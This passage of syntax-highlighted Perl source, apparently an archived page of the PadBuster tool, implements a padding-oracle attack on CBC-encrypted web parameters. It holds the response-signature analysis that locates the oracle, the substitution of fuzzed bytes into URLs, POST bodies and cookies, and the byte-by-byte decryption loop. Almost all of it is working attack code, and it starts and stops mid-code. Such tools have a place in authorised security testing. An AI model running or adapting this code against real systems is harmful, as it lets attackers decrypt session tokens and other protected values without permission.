	<span class="re0">&amp;myPrint</span><span class="br0">(</span><span class="st0">"[+] Decrypted value (HEX): "</span><span class="sy0">.</span><span class="re0">&amp;myEncode</span><span class="br0">(</span><span class="re0">$plainTextBytes</span><span class="sy0">,</span><span class="nu0">2</span><span class="br0">)</span><span class="sy0">.</span><span class="st0">"<span class="es0">\n</span>"</span><span class="sy0">,</span> <span class="nu0">0</span><span class="br0">)</span><span class="sy0">;</span>
	<span class="re0">&amp;myPrint</span><span class="br0">(</span><span class="st0">"[+] Decrypted value (Base64): "</span><span class="sy0">.</span><span class="re0">&amp;myEncode</span><span class="br0">(</span><span class="re0">$plainTextBytes</span><span class="sy0">,</span><span class="nu0">0</span><span class="br0">)</span><span class="sy0">.</span><span class="st0">"<span class="es0">\n</span>"</span><span class="sy0">,</span> <span class="nu0">0</span><span class="br0">)</span><span class="sy0">;</span>
<span class="br0">}</span>
<span class="re0">&amp;myPrint</span><span class="br0">(</span><span class="st0">"-------------------------------------------------------<span class="es0">\n</span>"</span><span class="sy0">,</span><span class="nu0">0</span><span class="br0">)</span><span class="sy0">;</span>	
&nbsp;
<span class="kw2">sub</span> determineSignature <span class="br0">{</span> 
	<span class="co1"># Help the user detect the oracle response if an error string was not provided</span>
	<span class="co1"># This logic will automatically suggest the response pattern that occured most often </span>
	<span class="co1"># during the test as this is the most likeley one</span>
&nbsp;
	<span class="kw1">my</span> <span class="re0">@sortedGuesses</span> <span class="sy0">=</span> <a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/sort.html"><span class="kw3">sort</span></a> <span class="br0">{</span><span class="re0">$oracleGuesses</span><span class="br0">{</span><span class="re0">$a</span><span class="br0">}</span> <span class="sy0">&lt;=&gt;</span> <span class="re0">$oracleGuesses</span><span class="br0">{</span><span class="re0">$b</span><span class="br0">}</span><span class="br0">}</span> <a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/keys.html"><span class="kw3">keys</span></a> <span class="re0">%oracleGuesses</span><span class="sy0">;</span> 
&nbsp;
	<span class="re0">&amp;myPrint</span><span class="br0">(</span><span class="st0">"The following response signatures were returned:<span class="es0">\n</span>"</span><span class="sy0">,</span><span class="nu0">0</span><span class="br0">)</span><span class="sy0">;</span>
	<span class="re0">&amp;myPrint</span><span class="br0">(</span><span class="st0">"-------------------------------------------------------"</span><span class="sy0">,</span><span class="nu0">0</span><span class="br0">)</span><span class="sy0">;</span>
	<span class="kw1">if</span> <span class="br0">(</span><span class="re0">$useBody</span><span class="br0">)</span> <span class="br0">{</span>
		<span class="re0">&amp;myPrint</span><span class="br0">(</span><span class="st0">"ID#<span class="es0">\t</span>Freq<span class="es0">\t</span>Status<span class="es0">\t</span>Length<span class="es0">\t</span>Chksum<span class="es0">\t</span>Location"</span><span class="sy0">,</span><span class="nu0">0</span><span class="br0">)</span><span class="sy0">;</span>
	<span class="br0">}</span> <span class="kw1">else</span> 	<span class="br0">{</span>
		<span class="re0">&amp;myPrint</span><span class="br0">(</span><span class="st0">"ID#<span class="es0">\t</span>Freq<span class="es0">\t</span>Status<span class="es0">\t</span>Length<span class="es0">\t</span>Location"</span><span class="sy0">,</span><span class="nu0">0</span><span class="br0">)</span><span class="sy0">;</span>
	<span class="br0">}</span>
	<span class="re0">&amp;myPrint</span><span class="br0">(</span><span class="st0">"-------------------------------------------------------"</span><span class="sy0">,</span><span class="nu0">0</span><span class="br0">)</span><span class="sy0">;</span>
&nbsp;
	<span class="kw1">my</span> <span class="re0">$id</span> <span class="sy0">=</span> <span class="nu0">1</span><span class="sy0">;</span>
&nbsp;
	<span class="kw1">foreach</span> <span class="br0">(</span><span class="re0">@sortedGuesses</span><span class="br0">)</span> <span class="br0">{</span>
		<span class="kw1">my</span> <span class="re0">$line</span> <span class="sy0">=</span> <span class="re0">$id</span><span class="sy0">;</span>
		<span class="br0">(</span><span class="re0">$id</span> <span class="sy0">==</span> <span class="re0">$#sortedGuesses</span><span class="sy0">+</span><span class="nu0">1</span> <span class="sy0">&amp;&amp;</span> <span class="re0">$#sortedGuesses</span> <span class="sy0">!=</span> <span class="nu0">0</span><span class="br0">)</span> <span class="sy0">?</span> <span class="re0">$line</span><span class="sy0">.=</span> <span class="st0">" **"</span> <span class="sy0">:</span> <span class="re0">$line</span><span class="sy0">.=</span><span class="st0">""</span><span class="sy0">;</span>
		<span class="kw1">my</span> <span class="re0">@sigFields</span> <span class="sy0">=</span> <a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/split.html"><span class="kw3">split</span></a><span class="br0">(</span><span class="st0">"<span class="es0">\t</span>"</span><span class="sy0">,</span> <span class="co5">$_</span><span class="br0">)</span><span class="sy0">;</span>
		<span class="re0">$line</span> <span class="sy0">.=</span> <span class="st0">"<span class="es0">\t</span>$oracleGuesses{$_}<span class="es0">\t</span>$sigFields[0]<span class="es0">\t</span>$sigFields[1]"</span><span class="sy0">;</span>
		<span class="re0">$useBody</span> <span class="sy0">?</span> <span class="br0">(</span> <span class="re0">$line</span> <span class="sy0">.=</span> <span class="st0">"<span class="es0">\t</span>"</span><span class="sy0">.</span><a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/unpack.html"><span class="kw3">unpack</span></a><span class="br0">(</span> <span class="st_h">'%32A*'</span><span class="sy0">,</span> <span class="re0">$sigFields</span><span class="br0">[</span><span class="nu0">3</span><span class="br0">]</span> <span class="br0">)</span> <span class="br0">)</span> <span class="sy0">:</span> <span class="re0">$line</span><span class="sy0">.=</span><span class="st0">""</span><span class="sy0">;</span>
		<span class="re0">$line</span> <span class="sy0">.=</span> <span class="st0">"<span class="es0">\t</span>$sigFields[2]"</span><span class="sy0">;</span>
		<span class="re0">&amp;myPrint</span><span class="br0">(</span><span class="re0">$line</span><span class="sy0">,</span><span class="nu0">0</span><span class="br0">)</span><span class="sy0">;</span>
		<span class="re0">&amp;writeFile</span><span class="br0">(</span><span class="st0">"Response_Analysis_Signature_"</span><span class="sy0">.</span><span class="re0">$id</span><span class="sy0">.</span><span class="st0">".txt"</span><span class="sy0">,</span> <span class="re0">$responseFileBuffer</span><span class="br0">{</span><span class="co5">$_</span><span class="br0">}</span><span class="br0">)</span><span class="sy0">;</span>
		<span class="re0">$id</span><span class="sy0">++;</span>
	<span class="br0">}</span>
	<span class="re0">&amp;myPrint</span><span class="br0">(</span><span class="st0">"-------------------------------------------------------"</span><span class="sy0">,</span><span class="nu0">0</span><span class="br0">)</span><span class="sy0">;</span>	
&nbsp;
	<span class="kw1">if</span> <span class="br0">(</span><span class="re0">$#sortedGuesses</span> <span class="sy0">==</span> <span class="nu0">0</span> <span class="sy0">&amp;&amp;</span> <span class="sy0">!</span><span class="re0">$bruteForce</span><span class="br0">)</span> <span class="br0">{</span>
		<span class="re0">&amp;myPrint</span><span class="br0">(</span><span class="st0">"<span class="es0">\n</span>ERROR: All of the responses were identical.<span class="es0">\n</span>"</span><span class="sy0">,</span><span class="nu0">0</span><span class="br0">)</span><span class="sy0">;</span>
		<span class="re0">&amp;myPrint</span><span class="br0">(</span><span class="st0">"Double check the Block Size and try again."</span><span class="sy0">,</span><span class="nu0">0</span><span class="br0">)</span><span class="sy0">;</span>
		<a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/exit.html"><span class="kw3">exit</span></a><span class="br0">(</span><span class="br0">)</span><span class="sy0">;</span>
	<span class="br0">}</span> <span class="kw1">else</span> <span class="br0">{</span>
		<span class="kw1">my</span> <span class="re0">$responseNum</span> <span class="sy0">=</span> <span class="re0">&amp;promptUser</span><span class="br0">(</span><span class="st0">"<span class="es0">\n</span>Enter an ID that matches the error condition<span class="es0">\n</span>NOTE: The ID# marked with ** is recommended"</span><span class="br0">)</span><span class="sy0">;</span>
		<span class="re0">&amp;myPrint</span><span class="br0">(</span><span class="st0">"<span class="es0">\n</span>Continuing test with selection $responseNum<span class="es0">\n</span>"</span><span class="sy0">,</span><span class="nu0">0</span><span class="br0">)</span><span class="sy0">;</span>
		<span class="re0">$oracleSignature</span> <span class="sy0">=</span> <span class="re0">$sortedGuesses</span><span class="br0">[</span><span class="re0">$responseNum</span><span class="sy0">-</span><span class="nu0">1</span><span class="br0">]</span><span class="sy0">;</span>
	<span class="br0">}</span>
<span class="br0">}</span>
&nbsp;
<span class="kw2">sub</span> prepRequest <span class="br0">{</span>
	<span class="kw1">my</span> <span class="br0">(</span><span class="re0">$pUrl</span><span class="sy0">,</span> <span class="re0">$pPost</span><span class="sy0">,</span> <span class="re0">$pCookie</span><span class="sy0">,</span> <span class="re0">$pSample</span><span class="sy0">,</span> <span class="re0">$pTestBytes</span><span class="br0">)</span> <span class="sy0">=</span> <span class="co5">@_</span><span class="sy0">;</span>
&nbsp;
	<span class="co1"># Prepare the request			</span>
	<span class="kw1">my</span> <span class="re0">$testUrl</span> <span class="sy0">=</span> <span class="re0">$pUrl</span><span class="sy0">;</span>
	<span class="kw1">my</span> <span class="re0">$wasSampleFound</span> <span class="sy0">=</span> <span class="nu0">0</span><span class="sy0">;</span>
&nbsp;
	<span class="kw1">if</span> <span class="br0">(</span><span class="re0">$pUrl</span> <span class="sy0">=~</span> <span class="co2">/$pSample/</span><span class="br0">)</span> <span class="br0">{</span>
		<span class="re0">$testUrl</span> <span class="sy0">=~</span> <span class="co2">s/$pSample/$pTestBytes/</span><span class="sy0">;</span>
		<span class="re0">$wasSampleFound</span> <span class="sy0">=</span> <span class="nu0">1</span><span class="sy0">;</span>
	<span class="br0">}</span> 
&nbsp;
	<span class="kw1">my</span> <span class="re0">$testPost</span> <span class="sy0">=</span> <span class="st0">""</span><span class="sy0">;</span>						
	<span class="kw1">if</span> <span class="br0">(</span><span class="re0">$pPost</span><span class="br0">)</span> <span class="br0">{</span>
		<span class="re0">$testPost</span> <span class="sy0">=</span> <span class="re0">$pPost</span><span class="sy0">;</span>
		<span class="kw1">if</span> <span class="br0">(</span><span class="re0">$pPost</span> <span class="sy0">=~</span> <span class="co2">/$pSample/</span><span class="br0">)</span> <span class="br0">{</span>
			<span class="re0">$testPost</span> <span class="sy0">=~</span> <span class="co2">s/$pSample/$pTestBytes/</span><span class="sy0">;</span>
			<span class="re0">$wasSampleFound</span> <span class="sy0">=</span> <span class="nu0">1</span><span class="sy0">;</span>
		<span class="br0">}</span>
	<span class="br0">}</span>
&nbsp;
	<span class="kw1">my</span> <span class="re0">$testCookies</span> <span class="sy0">=</span> <span class="st0">""</span><span class="sy0">;</span>
	<span class="kw1">if</span> <span class="br0">(</span><span class="re0">$pCookie</span><span class="br0">)</span> <span class="br0">{</span>
		<span class="re0">$testCookies</span> <span class="sy0">=</span> <span class="re0">$pCookie</span><span class="sy0">;</span>
		<span class="kw1">if</span> <span class="br0">(</span><span class="re0">$pCookie</span> <span class="sy0">=~</span> <span class="co2">/$pSample/</span><span class="br0">)</span> <span class="br0">{</span>
			<span class="re0">$testCookies</span> <span class="sy0">=~</span> <span class="co2">s/$pSample/$pTestBytes/</span><span class="sy0">;</span>
			<span class="re0">$wasSampleFound</span> <span class="sy0">=</span> <span class="nu0">1</span><span class="sy0">;</span>
		<span class="br0">}</span>
	<span class="br0">}</span>
&nbsp;
	<span class="kw1">if</span> <span class="br0">(</span><span class="re0">$wasSampleFound</span> <span class="sy0">==</span> <span class="nu0">0</span><span class="br0">)</span> <span class="br0">{</span>
		<span class="re0">&amp;myPrint</span><span class="br0">(</span><span class="st0">"ERROR: Encrypted sample was not found in the test request"</span><span class="sy0">,</span><span class="nu0">0</span><span class="br0">)</span><span class="sy0">;</span>
		<a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/exit.html"><span class="kw3">exit</span></a><span class="br0">(</span><span class="br0">)</span><span class="sy0">;</span>
	<span class="br0">}</span>
	<a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/return.html"><span class="kw3">return</span></a> <span class="br0">(</span><span class="re0">$testUrl</span><span class="sy0">,</span> <span class="re0">$testPost</span><span class="sy0">,</span> <span class="re0">$testCookies</span><span class="br0">)</span><span class="sy0">;</span>
<span class="br0">}</span>
&nbsp;
<span class="kw2">sub</span> processBlock <span class="br0">{</span>
  	<span class="kw1">my</span> <span class="br0">(</span><span class="re0">$sampleBytes</span><span class="br0">)</span> <span class="sy0">=</span> <span class="co5">@_</span><span class="sy0">;</span> 
  	<span class="kw1">my</span> <span class="re0">$analysisMode</span><span class="sy0">;</span>
  	<span class="co1"># Analysis mode is either 0 (response analysis) or 1 (exploit)  	</span>
  	<span class="re0">$analysisMode</span> <span class="sy0">=</span> <span class="br0">(</span><span class="sy0">!</span><span class="re0">$error</span> <span class="sy0">&amp;&amp;</span> <span class="re0">$oracleSignature</span> <span class="kw1">eq</span> <span class="st0">""</span><span class="br0">)</span> <span class="sy0">?</span> <span class="nu0">0</span> <span class="sy0">:</span> <span class="nu0">1</span><span class="sy0">;</span>
&nbsp;
  	<span class="co1"># The return value of this subroutine is the intermediate text for the block</span>
	<span class="kw1">my</span> <span class="re0">$returnValue</span><span class="sy0">;</span>
&nbsp;
  	<span class="kw1">my</span> <span class="re0">$complete</span> <span class="sy0">=</span> <span class="nu0">0</span><span class="sy0">;</span>
  	<span class="kw1">my</span> <span class="re0">$autoRetry</span> <span class="sy0">=</span> <span class="nu0">0</span><span class="sy0">;</span>
  	<span class="kw1">my</span> <span class="re0">$hasHit</span> <span class="sy0">=</span> <span class="nu0">0</span><span class="sy0">;</span>
&nbsp;
  	<span class="kw1">while</span> <span class="br0">(</span><span class="re0">$complete</span> <span class="sy0">==</span> <span class="nu0">0</span><span class="br0">)</span> <span class="br0">{</span>
  		<span class="co1"># Reset the return value</span>
  		<span class="re0">$returnValue</span> <span class="sy0">=</span> <span class="st0">""</span><span class="sy0">;</span>
&nbsp;
  		<span class="kw1">my</span> <span class="re0">$repeat</span> <span class="sy0">=</span> <span class="nu0">0</span><span class="sy0">;</span>
&nbsp;
		<span class="co1"># TestBytes are the fake bytes that are pre-pending to the cipher test for the padding attack</span>
		<span class="kw1">my</span> <span class="re0">$testBytes</span> <span class="sy0">=</span> <span class="st0">"<span class="es0">\x</span>00"</span> x <span class="re0">$blockSize</span><span class="sy0">;</span>
&nbsp;
		<span class="kw1">my</span> <span class="re0">$falsePositiveDetector</span> <span class="sy0">=</span> <span class="nu0">0</span><span class="sy0">;</span>
&nbsp;
		<span class="co1"># Work on one byte at a time, starting with the last byte and moving backwards</span>
		OUTERLOOP<span class="sy0">:</span>
		<span class="kw1">for</span> <span class="br0">(</span><span class="kw1">my</span> <span class="re0">$byteNum</span> <span class="sy0">=</span> <span class="re0">$blockSize</span> <span class="sy0">-</span> <span class="nu0">1</span><span class="sy0">;</span> <span class="re0">$byteNum</span> <span class="sy0">&gt;=</span> <span class="nu0">0</span><span class="sy0">;</span> <span class="re0">$byteNum</span><span class="sy0">--</span><span class="br0">)</span> <span class="br0">{</span>
			INNERLOOP<span class="sy0">:</span>
			<span class="kw1">for</span> <span class="br0">(</span><span class="kw1">my</span> <span class="re0">$i</span> <span class="sy0">=</span> <span class="nu0">255</span><span class="sy0">;</span> <span class="re0">$i</span> <span class="sy0">&gt;=</span> <span class="nu0">0</span><span class="sy0">;</span> <span class="re0">$i</span><span class="sy0">--</span><span class="br0">)</span> <span class="br0">{</span>			
				<span class="co1"># Fuzz the test byte</span>
				<a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/substr.html"><span class="kw3">substr</span></a><span class="br0">(</span><span class="re0">$testBytes</span><span class="sy0">,</span> <span class="re0">$byteNum</span><span class="sy0">,</span> <span class="nu0">1</span><span class="sy0">,</span> <a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/chr.html"><span class="kw3">chr</span></a><span class="br0">(</span><span class="re0">$i</span><span class="br0">)</span><span class="br0">)</span><span class="sy0">;</span>
&nbsp;
				<span class="co1"># Combine the test bytes and the sample</span>
				<span class="kw1">my</span> <span class="re0">$combinedTestBytes</span> <span class="sy0">=</span> <span class="re0">$testBytes</span><span class="sy0">.</span><span class="re0">$sampleBytes</span><span class="sy0">;</span>
&nbsp;
				<span class="kw1">if</span> <span class="br0">(</span><span class="re0">$prefix</span><span class="br0">)</span> <span class="br0">{</span>
					<span class="re0">$combinedTestBytes</span> <span class="sy0">=</span> <span class="re0">&amp;myDecode</span><span class="br0">(</span><span class="re0">$prefix</span><span class="sy0">,</span><span class="re0">$encodingFormat</span><span class="br0">)</span><span class="sy0">.</span><span class="re0">$combinedTestBytes</span> 
				<span class="br0">}</span>
&nbsp;
				<span class="re0">$combinedTestBytes</span> <span class="sy0">=</span> <span class="re0">&amp;myEncode</span><span class="br0">(</span><span class="re0">$combinedTestBytes</span><span class="sy0">,</span> <span class="re0">$encodingFormat</span><span class="br0">)</span><span class="sy0">;</span>				
				<a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/chomp.html"><span class="kw3">chomp</span></a><span class="br0">(</span><span class="re0">$combinedTestBytes</span><span class="br0">)</span><span class="sy0">;</span>
&nbsp;
				<span class="kw1">if</span> <span class="br0">(</span><span class="sy0">!</span> <span class="re0">$noEncodeOption</span><span class="br0">)</span> <span class="br0">{</span>
					<span class="re0">$combinedTestBytes</span> <span class="sy0">=</span> <span class="re0">&amp;uri_escape</span><span class="br0">(</span><span class="re0">$combinedTestBytes</span><span class="br0">)</span><span class="sy0">;</span> 
				<span class="br0">}</span>
&nbsp;
				<span class="kw1">my</span> <span class="br0">(</span><span class="re0">$testUrl</span><span class="sy0">,</span> <span class="re0">$testPost</span><span class="sy0">,</span> <span class="re0">$testCookies</span><span class="br0">)</span> <span class="sy0">=</span> <span class="re0">&amp;prepRequest</span><span class="br0">(</span><span class="re0">$url</span><span class="sy0">,</span> <span class="re0">$post</span><span class="sy0">,</span> <span class="re0">$cookie</span><span class="sy0">,</span> <span class="re0">$sample</span><span class="sy0">,</span> <span class="re0">$combinedTestBytes</span><span class="br0">)</span><span class="sy0">;</span>
&nbsp;
				<span class="co1"># Ok, now make the request</span>
&nbsp;
				<span class="kw1">my</span> <span class="br0">(</span><span class="re0">$status</span><span class="sy0">,</span> <span class="re0">$content</span><span class="sy0">,</span> <span class="re0">$location</span><span class="sy0">,</span> <span class="re0">$contentLength</span><span class="br0">)</span> <span class="sy0">=</span> <span class="re0">&amp;makeRequest</span><span class="br0">(</span><span class="re0">$method</span><span class="sy0">,</span> <span class="re0">$testUrl</span><span class="sy0">,</span> <span class="re0">$testPost</span><span class="sy0">,</span> <span class="re0">$testCookies</span><span class="br0">)</span><span class="sy0">;</span>
&nbsp;
&nbsp;
				<span class="kw1">my</span> <span class="re0">$signatureData</span> <span class="sy0">=</span> <span class="st0">"$status<span class="es0">\t</span>$contentLength<span class="es0">\t</span>$location"</span><span class="sy0">;</span>
				<span class="re0">$signatureData</span> <span class="sy0">=</span> <span class="st0">"$status<span class="es0">\t</span>$contentLength<span class="es0">\t</span>$location<span class="es0">\t</span>$content"</span> <span class="kw1">if</span> <span class="re0">$useBody</span><span class="sy0">;</span>
&nbsp;
				<span class="co1"># If this is the first block and there is no padding error message defined, then cycle through </span>
				<span class="co1"># all possible requests and let the user decide what the padding error behavior is.</span>
				<span class="kw1">if</span> <span class="br0">(</span><span class="re0">$analysisMode</span> <span class="sy0">==</span> <span class="nu0">0</span><span class="br0">)</span> <span class="br0">{</span>
					<span class="re0">&amp;myPrint</span><span class="br0">(</span><span class="st0">"INFO: No error string was provided...starting response analysis<span class="es0">\n</span>"</span><span class="sy0">,</span><span class="nu0">0</span><span class="br0">)</span> <span class="kw1">if</span> <span class="br0">(</span><span class="re0">$i</span> <span class="sy0">==</span> <span class="nu0">255</span><span class="br0">)</span><span class="sy0">;</span>
					<span class="re0">$oracleGuesses</span><span class="br0">{</span><span class="re0">$signatureData</span><span class="br0">}</span><span class="sy0">++;</span>
&nbsp;
					<span class="re0">$responseFileBuffer</span><span class="br0">{</span><span class="re0">$signatureData</span><span class="br0">}</span> <span class="sy0">=</span> <span class="st0">"URL: $testUrl<span class="es0">\n</span>Post Data: $testPost<span class="es0">\n</span>Cookies: $testCookies<span class="es0">\n</span><span class="es0">\n</span>Status: $status<span class="es0">\n</span>Location: $location<span class="es0">\n</span>Content-Length: $contentLength<span class="es0">\n</span>Content:<span class="es0">\n</span>$content"</span><span class="sy0">;</span>
&nbsp;
					<span class="kw1">if</span> <span class="br0">(</span><span class="re0">$byteNum</span> <span class="sy0">==</span> <span class="re0">$blockSize</span> <span class="sy0">-</span> <span class="nu0">1</span> <span class="sy0">&amp;&amp;</span> <span class="re0">$i</span> <span class="sy0">==</span> <span class="nu0">0</span><span class="br0">)</span> <span class="br0">{</span>
						<span class="re0">&amp;myPrint</span><span class="br0">(</span><span class="st0">"*** Response Analysis Complete ***<span class="es0">\n</span>"</span><span class="sy0">,</span><span class="nu0">0</span><span class="br0">)</span><span class="sy0">;</span>
						<span class="re0">&amp;determineSignature</span><span class="br0">(</span><span class="br0">)</span><span class="sy0">;</span>
						<span class="re0">$analysisMode</span> <span class="sy0">=</span> <span class="nu0">1</span><span class="sy0">;</span>
						<span class="re0">$repeat</span> <span class="sy0">=</span> <span class="nu0">1</span><span class="sy0">;</span>
						<span class="kw1">last</span> OUTERLOOP<span class="sy0">;</span>
					<span class="br0">}</span>
				<span class="br0">}</span>
&nbsp;
				<span class="kw1">my</span> <span class="re0">$continue</span> <span class="sy0">=</span> <span class="st0">"y"</span><span class="sy0">;</span>
&nbsp;
				<span class="kw1">if</span> <span class="br0">(</span><span class="br0">(</span><span class="re0">$error</span> <span class="sy0">&amp;&amp;</span> <span class="re0">$content</span> <span class="sy0">!~</span> <span class="co2">/$error/</span><span class="br0">)</span> <span class="sy0">||</span> <span class="br0">(</span><span class="re0">$oracleSignature</span> <span class="kw1">ne</span> <span class="st0">""</span> <span class="sy0">&amp;&amp;</span> <span class="re0">$oracleSignature</span> <span class="kw1">ne</span> <span class="re0">$signatureData</span><span class="br0">)</span><span class="br0">)</span> <span class="br0">{</span>
					<span class="co1"># This is for autoretry logic (only works on the first byte)</span>
					<span class="kw1">if</span> <span class="br0">(</span><span class="re0">$autoRetry</span> <span class="sy0">==</span> <span class="nu0">1</span> <span class="sy0">&amp;&amp;</span>  <span class="br0">(</span><span class="re0">$byteNum</span> <span class="sy0">==</span> <span class="br0">(</span><span class="re0">$blockSize</span> <span class="sy0">-</span> <span class="nu0">1</span><span class="br0">)</span> <span class="br0">)</span> <span class="sy0">&amp;&amp;</span> <span class="re0">$hasHit</span> <span class="sy0">==</span> <span class="nu0">0</span> <span class="br0">)</span> <span class="br0">{</span>
						<span class="re0">$hasHit</span><span class="sy0">++;</span>
					<span class="br0">}</span> <span class="kw1">else</span> <span class="br0">{</span>
						<span class="co1"># If there was no padding error, then it worked</span>
						<span class="re0">&amp;myPrint</span><span class="br0">(</span><span class="st0">"[+] Success: ("</span><span class="sy0">.</span><a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/abs.html"><span class="kw3">abs</span></a><span class="br0">(</span><span class="re0">$i</span><span class="sy0">-</span><span class="nu0">256</span><span class="br0">)</span><span class="sy0">.</span><span class="st0">"/256) [Byte "</span><span class="sy0">.</span><span class="br0">(</span><span class="re0">$byteNum</span><span class="sy0">+</span><span class="nu0">1</span><span class="br0">)</span><span class="sy0">.</span><span class="st0">"]"</span><span class="sy0">,</span><span class="nu0">0</span><span class="br0">)</span><span class="sy0">;</span>
						<span class="re0">&amp;myPrint</span><span class="br0">(</span><span class="st0">"[+] Test Byte:"</span><span class="sy0">.</span><span class="re0">&amp;uri_escape</span><span class="br0">(</span><a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/substr.html"><span class="kw3">substr</span></a><span class="br0">(</span><span class="re0">$testBytes</span><span class="sy0">,</span> <span class="re0">$byteNum</span><span class="sy0">,</span> <span class="nu0">1</span><span class="br0">)</span><span class="br0">)</span><span class="sy0">,</span><span class="nu0">1</span><span class="br0">)</span><span class="sy0">;</span>
&nbsp;
						<span class="co1"># If continually getting a hit on attempt zero, then something is probably wrong</span>
						<span class="re0">$falsePositiveDetector</span><span class="sy0">++</span> <span class="kw1">if</span> <span class="br0">(</span><span class="re0">$i</span> <span class="sy0">==</span> <span class="nu0">255</span><span class="br0">)</span><span class="sy0">;</span>
&nbsp;
						<span class="kw1">if</span> <span class="br0">(</span><span class="re0">$interactive</span> <span class="sy0">==</span> <span class="nu0">1</span><span class="br0">)</span> <span class="br0">{</span>
							<span class="re0">$continue</span> <span class="sy0">=</span> <span class="re0">&amp;promptUser</span><span class="br0">(</span><span class="st0">"Do you want to use this value (Yes/No/All)? [y/n/a]"</span><span class="sy0">,</span><span class="st0">""</span><span class="sy0">,</span><span class="nu0">1</span><span class="br0">)</span><span class="sy0">;</span>
						<span class="br0">}</span>
&nbsp;
						<span class="kw1">if</span> <span class="br0">(</span><span class="re0">$continue</span> <span class="kw1">eq</span> <span class="st0">"y"</span> <span class="sy0">||</span> <span class="re0">$continue</span> <span class="kw1">eq</span> <span class="st0">"a"</span><span class="br0">)</span> <span class="br0">{</span>
							<span class="re0">$interactive</span> <span class="sy0">=</span> <span class="nu0">0</span> <span class="kw1">if</span> <span class="br0">(</span><span class="re0">$continue</span> <span class="kw1">eq</span> <span class="st0">"a"</span><span class="br0">)</span><span class="sy0">;</span>
&nbsp;
							<span class="co1"># Next, calculate the decrypted byte by XORing it with the padding value</span>
							<span class="kw1">my</span> <span class="br0">(</span><span class="re0">$currentPaddingByte</span><span class="sy0">,</span> <span class="re0">$nextPaddingByte</span><span class="br0">)</span><span class="sy0">;</span>
&nbsp;
							<span class="co1"># These variables could allow for flexible padding schemes (for now PCKS)</span>
							<span class="co1"># For PCKS#7, the padding block is equal to chr($blockSize - $byteNum)</span>
							<span class="re0">$currentPaddingByte</span> <span class="sy0">=</span> <a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/chr.html"><span class="kw3">chr</span></a><span class="br0">(</span><span class="re0">$blockSize</span> <span class="sy0">-</span> <span class="re0">$byteNum</span><span class="br0">)</span><span class="sy0">;</span>
							<span class="re0">$nextPaddingByte</span> <span class="sy0">=</span> <a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/chr.html"><span class="kw3">chr</span></a><span class="br0">(</span><span class="re0">$blockSize</span> <span class="sy0">-</span> <span class="re0">$byteNum</span> <span class="sy0">+</span> <span class="nu0">1</span><span class="br0">)</span><span class="sy0">;</span>
&nbsp;
							<span class="kw1">my</span> <span class="re0">$decryptedByte</span> <span class="sy0">=</span> <a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/substr.html"><span class="kw3">substr</span></a><span class="br0">(</span><span class="re0">$testBytes</span><span class="sy0">,</span> <span class="re0">$byteNum</span><span class="sy0">,</span> <span class="nu0">1</span><span class="br0">)</span> <span class="sy0">^</span> <span class="re0">$currentPaddingByte</span><span class="sy0">;</span>
							<span class="re0">&amp;myPrint</span><span class="br0">(</span><span class="st0">"[+] XORing with Padding Char, which is "</span><span class="sy0">.</span><span class="re0">&amp;uri_escape</span><span class="br0">(</span><span class="re0">$currentPaddingByte</span><span class="br0">)</span><span class="sy0">,</span><span class="nu0">1</span><span class="br0">)</span><span class="sy0">;</span>
&nbsp;
							<span class="re0">$returnValue</span> <span class="sy0">=</span> <span class="re0">$decryptedByte</span><span class="sy0">.</span><span class="re0">$returnValue</span><span class="sy0">;</span>
							<span class="re0">&amp;myPrint</span><span class="br0">(</span><span class="st0">"[+] Decrypted Byte is: "</span><span class="sy0">.</span><span class="re0">&amp;uri_escape</span><span class="br0">(</span><span class="re0">$decryptedByte</span><span class="br0">)</span><span class="sy0">,</span><span class="nu0">1</span><span class="br0">)</span><span class="sy0">;</span>
&nbsp;
							<span class="co1"># Finally, update the test bytes in preparation for the next round, based on the padding used </span>
							<span class="kw1">for</span> <span class="br0">(</span><span class="kw1">my</span> <span class="re0">$k</span> <span class="sy0">=</span> <span class="re0">$byteNum</span><span class="sy0">;</span> <span class="re0">$k</span> <span class="sy0">&lt;</span> <span class="re0">$blockSize</span><span class="sy0">;</span> <span class="re0">$k</span><span class="sy0">++</span><span class="br0">)</span> <span class="br0">{</span>
								<span class="co1"># First, XOR the current test byte with the padding value for this round to recover the decrypted byte</span>
								<a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/substr.html"><span class="kw3">substr</span></a><span class="br0">(</span><span class="re0">$testBytes</span><span class="sy0">,</span> <span class="re0">$k</span><span class="sy0">,</span> <span class="nu0">1</span><span class="sy0">,</span><span class="br0">(</span><a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/substr.html"><span class="kw3">substr</span></a><span class="br0">(</span><span class="re0">$testBytes</span><span class="sy0">,</span> <span class="re0">$k</span><span class="sy0">,</span> <span class="nu0">1</span><span class="br0">)</span> <span class="sy0">^</span> <span class="re0">$currentPaddingByte</span><span class="br0">)</span><span class="br0">)</span><span class="sy0">;</span>				
&nbsp;
								<span class="co1"># Then, XOR it again with the padding byte for the next round</span>
								<a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/substr.html"><span class="kw3">substr</span></a><span class="br0">(</span><span class="re0">$testBytes</span><span class="sy0">,</span> <span class="re0">$k</span><span class="sy0">,</span> <span class="nu0">1</span><span class="sy0">,</span><span class="br0">(</span><a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/substr.html"><span class="kw3">substr</span></a><span class="br0">(</span><span class="re0">$testBytes</span><span class="sy0">,</span> <span class="re0">$k</span><span class="sy0">,</span> <span class="nu0">1</span><span class="br0">)</span> <span class="sy0">^</span> <span class="re0">$nextPaddingByte</span><span class="br0">)</span><span class="br0">)</span><span class="sy0">;</span>
							<span class="br0">}</span>
